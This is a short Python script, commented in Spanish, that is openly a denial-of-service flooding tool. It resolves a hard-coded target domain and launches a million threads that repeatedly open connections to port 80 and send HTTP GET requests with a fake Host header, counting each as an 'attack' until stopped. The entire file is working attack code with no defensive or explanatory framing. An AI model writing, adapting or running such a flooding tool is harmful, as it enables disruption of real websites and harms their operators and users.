import socket
import threading
import os

# Solicitar la URL del sitio web y obtener la dirección IP
target_url = "molxno.vercel.app" #str(input("Insert target’s URL: "))

try:
    target = socket.gethostbyname("molxno.vercel.app")
    print(f"La dirección IP de {target_url} es: {target}")
except socket.gaierror:
    print(
        f"No se pudo obtener la IP de {target_url}. Verifica que el dominio sea correcto.")
    exit()  # Salir si no se puede resolver el dominio

port = 80 # int(input("Insert Port: "))
Trd = 1000000 # int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'

attack_num = 0  # Inicializar la variable
is_running = True  # Variable de control para parar los hilos


def attack():
    global attack_num  # Usar la variable global para contar ataques
    while is_running:  # Condición para continuar con los ataques
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
                     (target, port))
            s.close()

            attack_num += 1  # Incrementar el contador de ataques
            print(f"Attack number: {attack_num}")
        except Exception as e:
            print(f"Error: {e}")
            break


def stop_attacks():
    global is_running
    is_running = False
    print("Stopping attacks...")


# Crear y ejecutar los hilos
threads = []
for i in range(Trd):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

# Esperar a que el usuario decida parar
input("Press Enter to stop the attacks.\n")
stop_attacks()

# Esperar a que todos los hilos terminen
for thread in threads:
    thread.join()

print("All attacks stopped.")

# Comandos opcionales para la terminal (solo si estás en Linux/Unix)
os.system("clear")  # Limpia la terminal
os.system("toilet ToolName")  # Muestra el nombre de la herramienta
